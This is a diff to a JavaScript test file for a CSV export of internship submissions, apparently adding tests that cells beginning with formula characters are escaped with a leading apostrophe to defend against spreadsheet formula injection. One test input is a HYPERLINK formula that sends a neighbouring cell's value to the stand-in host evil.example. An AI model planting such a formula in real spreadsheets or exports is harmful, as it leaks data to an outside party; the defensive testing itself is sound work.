@@ -132,7 +132,10 @@ test("SPARTA CSV: byte for byte today's file, partial drafts and a missing divis
   const next = submissionsCsv(subs, divisions, byId, NOW);
   assert.equal(next.filename, old.filename);
   assert.equal(next.filename, 'internship-submissions-2026-10-08-06-35-12.csv');
-  assert.equal(bytesOf(next.content), old.bytes);
+  // One cell differs from today's file: the missing division's "-" starts with `'`, as every cell starting with a
+  // formula character does.
+  assert.equal(old.bytes.split(',,-,,').length, 2);
+  assert.equal(bytesOf(next.content), old.bytes.replace(',,-,,', ",,'-,,"));
   const lines = next.content.split('\n');
   assert.equal(
     lines[0],
@@ -160,4 +163,23 @@ test('escapeCsvValue quotes ", comma and line breaks; regression: \\r too', () =
   assert.equal(escapeCsvValue(undefined), '');
   assert.equal(escapeCsvValue(7), '7');
   assert.equal(rowsToCsv(['h'], [['x\ry']]), 'h\n"x\ry"');
+});
+
+test('a cell a spreadsheet would read as a formula is written as text', () => {
+  assert.equal(escapeCsvValue('=1+1'), "'=1+1");
+  assert.equal(escapeCsvValue('+62812'), "'+62812");
+  assert.equal(escapeCsvValue('-2+3'), "'-2+3");
+  assert.equal(escapeCsvValue('@SUM(1)'), "'@SUM(1)");
+  assert.equal(escapeCsvValue('\t=1+1'), "'\t=1+1");
+  assert.equal(escapeCsvValue('\r=1+1'), '"\'\r=1+1"');
+  // Quoting still follows, around the marked cell.
+  assert.equal(
+    escapeCsvValue('=HYPERLINK("https://evil.example/?"&B2,"klik")'),
+    '"\'=HYPERLINK(""https://evil.example/?""&B2,""klik"")"',
+  );
+  // Only the first character counts.
+  assert.equal(escapeCsvValue('a=b'), 'a=b');
+  assert.equal(escapeCsvValue(' =1'), ' =1');
+  assert.equal(escapeCsvValue(-5), "'-5");
+  assert.equal(rowsToCsv(['h'], [['@x']]), "h\n'@x");
 });
